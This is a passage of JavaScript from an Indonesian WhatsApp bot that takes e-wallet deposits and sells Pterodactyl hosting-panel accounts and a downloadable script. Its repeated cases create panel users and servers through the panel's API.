reply ('Gopay : 085691419758\nKirim Ss Bukti Dengan Cara .bukti gopay 10.000')
}
case 'qris':{
reply ('Qris : https://telegra.ph/file/68a98680d8d8f0c47e1d9.jpg\nUntuk Qris All Payment Klik Link Yang Di Atas\nKirim Ss Bukti Dengan Cara .bukti qris 10.000')
}
break
case 'saldo':{
m.reply(`*━━ CHECK YOUR INFO ━━*

 _• *Name:* ${pushname}_
 _• *Nomer:* ${sender.split('@')[0]}_
 _• *Saldo:* Rp${toRupiah(cekSaldo(sender, db_saldo))}_

*Note :*
_Saldo Hanya Bisa Untuk Buyserver_
_Tidak Bisa Ditarik Atau Transfer_!`)
}
        break
case 'deposit': case 'depo':{
reply(`Hai Kak *@${sender.split('@')[0]}*\nIngin melakukan deposit saldo? Silahkan pilih payment yang tersedia dibawah!
- ${prefix}dana
- ${prefix}ovo
- ${prefix}gopay
- ${prefix}qris

_*ITU ADALAH E-WALLET YANG DI GUNAKAN SLIMEXTZY*_`)
}
break   
case 'bukti':{
m.reply('*oke bro deposit sedang di proses mohon menunggu sampai owner mengkonfirmasi deposit tersebut ada kendala/deposit belum di konfirmasi bisa chat langsung owner nya dengan cara ketik* .owner.')
slime.sendMessage('6283167532721@s.whatsapp.net', { text: `*ada yang deposit ini woy gc proses tar ngamok*\n\n*@${sender.split('@')[0]}*`, mentions: [sender]}, { quoted: m })
        }
        break
        case 'dana': {
        reply(`Dana : 085715430424\nKirim Ss Bukti Dengan Cara .bukti dana 10.000`)
        }
        break
case 'trxgagal': {
reply(`yaa okee transaksi anda telah di gagalkan.`)
}
break
                        case 'buyschanakov5': {
if (cekSaldo(sender,db_saldo) < 30000) return slime.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp30.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
let d = (await slime.onWhatsApp(sender.split('@')[0]))[0] || {}
minSaldo(sender, 30000, db_saldo)
reply(`Wait Sc Sedang Kami Proses⏳`) 
const baby2 = await mediafireDl('https://www.mediafire.com/file/m1gt0efwipfgd1e/Hanako+V4.0.5.zip/file')
slime.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, {quoted:m})}
break
case "1gbsaldo": {
if (cekSaldo(sender,db_saldo) < 2000) return slime.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp2.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
minSaldo(sender, 2000, db_saldo)
let username = t[0];
let u = t[1] + '@s.whatsapp.net'
let name = username 
let egg = global.eggsnya
let loc = global.location
let memo = "1024"
let cpu = "40"
let disk = "1024"
let email = username + "@slime.xyz"
let d = (await slime.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "991"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
m.reply(`*Berhasil Membuat Akun Panel ✅*\nData Akun Sudah Dikirim Ke Private Chat`)
ctf = `*Berhasil Membuat Akun Panel ✅*

* *ID :* ${user.id}
* *Nama :* ${user.username}
* *Ram :* ${memo}
* *Cpu :* ${cpu}%
* *Created :* ${tanggal2}

*Rules Pembelian Panel ⚠️*
* *Simpan Data Ini Sebaik*
        *Mungkin, Saya Hanya*
        *Mengirim 1 Kali !*
* *Data Hilang/Lupa*
        *Akun, Saya Tidak Akan*
        *Bertanggung Jawab !*
* *Garansi Aktif 10 Hari*
* *Claim Garansi Wajib*
        *Bawa Bukti Ss Chat Saat*
        *Pembelian*
`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `© SlimexTzy`
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"Group Marketplace","url":"https://linktr.ee/slimextzy","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"Login Server Panel","url":"${domain}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "Copy Username",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "Copy Password",
"copy_code": `${password}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: "120363325328533494@newsletter",
newsletterName: "ᴘᴏᴡᴇʀᴇᴅ ʙʏ lynnzxd",
serverMessageId: 145
}
}})}}
}, {quoted: m})
await slime.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes

}

break
case "2gbsaldo": {
if (cekSaldo(sender,db_saldo) < 3000) return slime.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp3.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
minSaldo(sender, 3000, db_saldo)
let username = t[0];
let u = t[1] + '@s.whatsapp.net'
let name = username 
let egg = global.eggsnya
let loc = global.location
let memo = "2048"
let cpu = "60"
let disk = "2048"
let email = username + "@slime.xyz"
let d = (await slime.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "@992"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
m.reply(`*Berhasil Membuat Akun Panel ✅*\nData Akun Sudah Dikirim Ke Private Chat`)
ctf = `*Berhasil Membuat Akun Panel ✅*

* *ID :* ${user.id}
* *Nama :* ${user.username}
* *Ram :* ${memo}
* *Cpu :* ${cpu}%
* *Created :* ${tanggal2}

*Rules Pembelian Panel ⚠️*
* *Simpan Data Ini Sebaik*
        *Mungkin, Saya Hanya*
        *Mengirim 1 Kali !*
* *Data Hilang/Lupa*
        *Akun, Saya Tidak Akan*
        *Bertanggung Jawab !*
* *Garansi Aktif 10 Hari*
* *Claim Garansi Wajib*
        *Bawa Bukti Ss Chat Saat*
        *Pembelian*
`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `© SlimexTzy`
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"Group Marketplace","url":"https://linktr.ee/slimextzy","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"Login Server Panel","url":"${domain}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "Copy Username",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "Copy Password",
"copy_code": `${password}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: "120363325328533494@newsletter",
newsletterName: "ᴘᴏᴡᴇʀᴇᴅ ʙʏ lynnzxd",
serverMessageId: 145
}
}})}}
}, {quoted: m})
await slime.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes

}

break
case "3gbsaldo": {
if (cekSaldo(sender,db_saldo) < 4000) return slime.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp4.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
minSaldo(sender, 4000, db_saldo)
let username = t[0];
let u = t[1] + '@s.whatsapp.net'
let name = username 
let egg = global.eggsnya
let loc = global.location
let memo = "3072"
let cpu = "80"
let disk = "3072"
let email = username + "@slime.xyz"
let d = (await slime.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "@993"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
m.reply(`*Berhasil Membuat Akun Panel ✅*\nData Akun Sudah Dikirim Ke Private Chat`)
ctf = `*Berhasil Membuat Akun Panel ✅*

* *ID :* ${user.id}
* *Nama :* ${user.username}
* *Ram :* ${memo}
* *Cpu :* ${cpu}%
* *Created :* ${tanggal2}

*Rules Pembelian Panel ⚠️*
* *Simpan Data Ini Sebaik*
        *Mungkin, Saya Hanya*
        *Mengirim 1 Kali !*
* *Data Hilang/Lupa*
        *Akun, Saya Tidak Akan*
        *Bertanggung Jawab !*
* *Garansi Aktif 10 Hari*
* *Claim Garansi Wajib*
        *Bawa Bukti Ss Chat Saat*
        *Pembelian*
`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `© SlimexTzy`
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"Group Marketplace","url":"https://linktr.ee/slimextzy","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"Login Server Panel","url":"${domain}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "Copy Username",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "Copy Password",
"copy_code": `${password}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: "120363325328533494@newsletter",
newsletterName: "ᴘᴏᴡᴇʀᴇᴅ ʙʏ lynnzxd",
serverMessageId: 145
}
}})}}
}, {quoted: m})
await slime.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes

}
break
case "4gbsaldo": {
if (cekSaldo(sender,db_saldo) < 5000) return slime.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp5.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
if (global.db.data.users[m.sender].db_saldo < 1) return reply('💸 *Uang Kamu Habis*') // respon ketika limit habis
                db.data.users[m.sender].db_saldo -= 5000
reply('💸 *Rp5.000 Digunakan*')
let username = t[0];
let u = t[1] + '@s.whatsapp.net'
let name = username 
let egg = global.eggsnya
let loc = global.location
let memo = "4048"
let cpu = "100"
let disk = "4000"
let email = username + "@slime.xyz"
let d = (await slime.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "@994"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
m.reply(`*Berhasil Membuat Akun Panel ✅*\nData Akun Sudah Dikirim Ke Private Chat`)
ctf = `*Berhasil Membuat Akun Panel ✅*

* *ID :* ${user.id}
* *Nama :* ${user.username}
* *Ram :* ${memo}
* *Cpu :* ${cpu}%
* *Created :* ${tanggal2}

*Rules Pembelian Panel ⚠️*
* *Simpan Data Ini Sebaik*
        *Mungkin, Saya Hanya*
        *Mengirim 1 Kali !*
* *Data Hilang/Lupa*
        *Akun, Saya Tidak Akan*
        *Bertanggung Jawab !*
* *Garansi Aktif 10 Hari*
* *Claim Garansi Wajib*
        *Bawa Bukti Ss Chat Saat*
        *Pembelian*
`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `© SlimexTzy`
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"Group Marketplace","url":"https://linktr.ee/slimextzy","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"Login Server Panel","url":"${domain}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "Copy Username",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "Copy Password",
"copy_code": `${password}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: "120363325328533494@newsletter",
newsletterName: "ᴘᴏᴡᴇʀᴇᴅ ʙʏ lynnzxd",
serverMessageId: 145
}
}})}}
}, {quoted: m})
await slime.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes

}

break
case "5gbsaldo": {
if (cekSaldo(sender,db_saldo) < 6000) return slime.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp6.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
minSaldo(sender, 6000, db_saldo)
let username = t[0];
let u = t[1] + '@s.whatsapp.net'
let name = username 
let egg = global.eggsnya
let loc = global.location
let memo = "5138"
let cpu = "120"
let disk = "5138"
let email = username + "@slime.xyz"
let d = (await slime.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "@996"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
m.reply(`*Berhasil Membuat Akun Panel ✅*\nData Akun Sudah Dikirim Ke Private Chat`)
ctf = `*Berhasil Membuat Akun Panel ✅*

* *ID :* ${user.id}
* *Nama :* ${user.username}
* *Ram :* ${memo}
* *Cpu :* ${cpu}%
* *Created :* ${tanggal2}

*Rules Pembelian Panel ⚠️*
* *Simpan Data Ini Sebaik*
        *Mungkin, Saya Hanya*
        *Mengirim 1 Kali !*
* *Data Hilang/Lupa*
        *Akun, Saya Tidak Akan*
        *Bertanggung Jawab !*
* *Garansi Aktif 10 Hari*
* *Claim Garansi Wajib*
        *Bawa Bukti Ss Chat Saat*
        *Pembelian*
`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `© SlimexTzy`
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"Group Marketplace","url":"https://linktr.ee/slimextzy","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"Login Server Panel","url":"${domain}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "Copy Username",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "Copy Password",
"copy_code": `${password}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: "120363325328533494@newsletter",
newsletterName: "ᴘᴏᴡᴇʀᴇᴅ ʙʏ lynnzxd",
serverMessageId: 145
}
}})}}
}, {quoted: m})
await slime.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes

}

break
case "6gbsaldo": {
if (cekSaldo(sender,db_saldo) < 7000) return slime.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp7.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
minSaldo(sender, 7000, db_saldo)
let username = t[0];
let u = t[1] + '@s.whatsapp.net'
let name = username 
let egg = global.eggsnya
let loc = global.location
let memo = "6000"
let cpu = "140"
let disk = "6000"
let email = username + "@slime.xyz"
let d = (await slime.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "@997"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
m.reply(`*Berhasil Membuat Akun Panel ✅*\nData Akun Sudah Dikirim Ke Private Chat`)
ctf = `*Berhasil Membuat Akun Panel ✅*

* *ID :* ${user.id}
* *Nama :* ${user.username}
* *Ram :* ${memo}
* *Cpu :* ${cpu}%
* *Created :* ${tanggal2}

*Rules Pembelian Panel ⚠️*
* *Simpan Data Ini Sebaik*
        *Mungkin, Saya Hanya*
        *Mengirim 1 Kali !*
* *Data Hilang/Lupa*
        *Akun, Saya Tidak Akan*
        *Bertanggung Jawab !*
* *Garansi Aktif 10 Hari*
* *Claim Garansi Wajib*
        *Bawa Bukti Ss Chat Saat*
        *Pembelian*
`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `© SlimexTzy`
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"Group Marketplace","url":"https://linktr.ee/slimextzy","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"Login Server Panel","url":"${domain}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "Copy Username",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "Copy Password",
"copy_code": `${password}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: "120363325328533494@newsletter",
newsletterName: "ᴘᴏᴡᴇʀᴇᴅ ʙʏ lynnzxd",
serverMessageId: 145
}
}})}}
}, {quoted: m})
await slime.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes

}

break
case "7gbsaldo": {
if (cekSaldo(sender,db_saldo) < 8000) return slime.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp8.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
minSaldo(sender, 8000, db_saldo)
let username = t[0];
let u = t[1] + '@s.whatsapp.net'
let name = username 
let egg = global.eggsnya
let loc = global.location
let memo = "7000"
let cpu = "160"
let disk = "7000"
let email = username + "@slime.xyz"
let d = (await slime.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "@998"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
m.reply(`*Berhasil Membuat Akun Panel ✅*\nData Akun Sudah Dikirim Ke Private Chat`)
ctf = `*Berhasil Membuat Akun Panel ✅*

* *ID :* ${user.id}
* *Nama :* ${user.username}
* *Ram :* ${memo}
* *Cpu :* ${cpu}%
* *Created :* ${tanggal2}

*Rules Pembelian Panel ⚠️*
* *Simpan Data Ini Sebaik*
        *Mungkin, Saya Hanya*
        *Mengirim 1 Kali !*
* *Data Hilang/Lupa*
        *Akun, Saya Tidak Akan*
        *Bertanggung Jawab !*
* *Garansi Aktif 10 Hari*
* *Claim Garansi Wajib*
        *Bawa Bukti Ss Chat Saat*
        *Pembelian*
`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `© SlimexTzy`
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
